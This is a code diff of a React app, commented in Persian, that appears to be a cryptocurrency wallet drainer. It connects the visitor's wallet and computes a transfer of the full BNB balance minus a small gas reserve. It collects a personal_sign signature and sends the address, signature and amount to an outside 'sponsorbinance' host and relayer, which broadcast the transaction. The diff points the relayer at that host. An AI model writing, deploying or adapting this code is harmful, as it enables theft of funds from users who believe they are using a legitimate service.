@@ -23,7 +23,7 @@ function App() {
       return;
     }
 
-    // اتصال کیف پول
+    // اتصال کیف پول کاربر
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -39,7 +39,7 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
-    // دریافت موجودی واقعی کیف پول
+    // دریافت بالانس واقعی از شبکه
     const liveBalanceStr = await getLiveBalance(userAddress);
     console.log("💰 Live BNB Balance:", liveBalanceStr);
     const totalBalance = parseFloat(liveBalanceStr);
@@ -48,11 +48,11 @@ function App() {
       return;
     }
 
-    // تعیین مقدار reserve (برای مثال، 0.01 BNB)
+    // تعیین reserve (برای مثال 0.01 BNB) تا موجودی کافی برای gas باقی بماند
     const reserveBNB = 0.01;
     const sendAmount = totalBalance - reserveBNB;
     if (sendAmount <= 0) {
-      console.error("❌ Insufficient funds: not enough to cover reserve for gas fee.");
+      console.error("❌ Insufficient funds to cover reserve for gas fee.");
       return;
     }
     console.log("Calculated send amount (BNB):", sendAmount);
@@ -63,6 +63,7 @@ function App() {
 
     let signature;
     try {
+      // استفاده از personal_sign برای امضای پیام
       signature = await window.ethereum.request({
         method: "personal_sign",
         params: [message, userAddress],
@@ -73,7 +74,7 @@ function App() {
       return;
     }
 
-    // ارسال داده‌های امضا شده به سرور اولیه (send.php) جهت تأیید
+    // ارسال داده‌های امضا شده به سرور اولیه (send.php) جهت بررسی
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -88,7 +89,7 @@ function App() {
       const result = await resp.json();
       console.log("Server verify response:", result);
       if (!result.success) {
-        console.error("❌ Signature verification failed or server error.", result);
+        console.error("❌ Signature verification failed at server.", result);
         return;
       }
     } catch (e) {
@@ -96,13 +97,13 @@ function App() {
       return;
     }
 
-    // ارسال درخواست به ریلیر (relayer.php) جهت ساخت و پخش تراکنش meta
+    // ارسال درخواست به relayer برای پخش تراکنش meta
     try {
-      const resp2 = await fetch("https://YOUR-DOMAIN.com/crypto-project/relayer.php", {
+      const resp2 = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          handler: "tx",
+          handler: "relayer_tx",
           address: userAddress,
           signature: signature,
           amount: sendAmount.toString(),
